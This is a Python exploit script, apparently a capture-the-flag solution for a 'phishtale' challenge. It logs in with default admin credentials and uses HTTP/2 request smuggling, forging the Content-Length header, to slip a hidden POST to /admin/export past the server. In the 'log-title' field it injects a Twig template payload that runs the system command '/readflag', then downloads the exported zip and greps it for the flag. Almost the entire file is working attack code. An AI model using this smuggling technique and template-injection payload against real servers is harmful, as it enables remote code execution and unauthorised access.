#!/usr/bin/python3
import sys
import httpx
import json
import os

url = f'https://{sys.argv[1]}'

dbg = True
def log_debug(s):
    if dbg:
        print('[dbg]', s)

def get_raw_request(req):
    headers = '\r\n'.join(f'{k}: {v}' for k, v in req.headers.items())
    body = req.content.decode()
    return f'{req.method} {str(req.url).split(url)[1]} HTTP/1.1\r\n{headers}\r\n\r\n{body}'

ses = httpx.Client(http2=True,verify=False)#,limits=httpx.Limits(max_keepalive_connections=1, max_connections=1))

res = ses.post(f'{url}/login', 
    data={'username': 'admin', 'password': 'admin'})
log_debug(res)

req_smug = ses.build_request('POST', f'{url}/admin/export', 
    data={
        'template-page': 'facebook',
        'campaign': 'camp',
        'log-title': "{{ ['/readflag', '']|sort('system') }}",
        'slack-url': 'slurl',
        'redirect-url': 'reurl'
    })
log_debug(req_smug)

req = ses.build_request('POST', f'{url}/', content = 'a' + get_raw_request(req_smug))
log_debug(req)

req.headers['Content-Length'] = '1'

log_debug(get_raw_request(req))

res = ses.send(req)
log_debug(res)

res = ses.get(f'{url}/static/exports/phishtale.zip')
log_debug(res)

with open('phishtale.zip', 'wb') as f:
    f.write(res.content)

os.system('unzip -p phishtale.zip facebook/index.php | grep HTB')
